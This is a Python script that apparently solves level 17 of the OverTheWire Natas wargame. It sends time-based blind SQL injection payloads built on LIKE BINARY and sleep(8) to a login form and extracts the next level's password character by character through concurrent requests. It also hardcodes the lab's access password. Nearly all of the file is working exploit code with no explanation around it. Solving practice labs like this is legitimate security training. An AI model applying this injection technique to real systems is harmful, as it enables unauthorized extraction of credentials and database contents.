import aiohttp
import asyncio
import string
import time

URL = "http://natas17.natas.labs.overthewire.org/"
NATAS17_PASSWORD = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"  # Change this
INJECTION_TIME = 8  # Time delay for blind sql injection in seconds


async def get_password_request(session, payload_string, character):
    payload = f'natas18" AND password LIKE BINARY "{payload_string}%" AND sleep({INJECTION_TIME})-- -'
    data = {"username": payload}

    start = time.time()
    async with session.post(URL, data=data) as _:
        elapsed_time = time.time() - start

        return elapsed_time, character


async def get_password(session, valid_characters):
    print("[!] The password for natas18 is: ", end="", flush=True)
    natas18_password = ""

    for _ in range(32):
        tasks = []
        for character in valid_characters:
            payload_string = natas18_password + character
            tasks.append(asyncio.ensure_future(get_password_request(session, payload_string, character)))

        requests = await asyncio.gather(*tasks)

        for request in requests:
            if request[0] >= INJECTION_TIME:
                """
                If elapsed time of the request is >= INJECTION_TIME
                that means that the injection was successfull
                and request[1] is a valid character
                """
                natas18_password += request[1]
                print(request[1], end="", flush=True)

    return


async def get_valid_chars_request(session, character):
    payload = f'natas18" AND password LIKE BINARY "%{character}%" AND sleep({INJECTION_TIME})-- -'
    data = {"username": payload}

    start = time.time()
    async with session.post(URL, data=data) as _:
        elapsed_time = time.time() - start

        return elapsed_time, character


async def get_valid_chars(session):
    print("[+] The password for natas18 contains these characters: ", end="", flush=True)
    characters = string.digits + string.ascii_letters
    valid_characters = ""
    tasks = []

    for character in characters:
        tasks.append(asyncio.ensure_future(get_valid_chars_request(session, character)))

    requests = await asyncio.gather(*tasks)

    for request in requests:
        if request[0] >= INJECTION_TIME:
            """
            If elapsed time of the request is >= INJECTION_TIME
            that means that the injection was successfull
            and request[1] is a valid character
            """
            valid_characters += request[1]

    print(valid_characters)
    return valid_characters


async def main():
    auth = aiohttp.BasicAuth("natas17", NATAS17_PASSWORD)

    async with aiohttp.ClientSession(auth=auth) as session:
        valid_characters = await get_valid_chars(session)
        await get_password(session, valid_characters)
    return


if __name__ == "__main__":
    start = time.time()

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    asyncio.run(main())

    time_lapsed = time.time() - start
    print()
    print(time_lapsed)
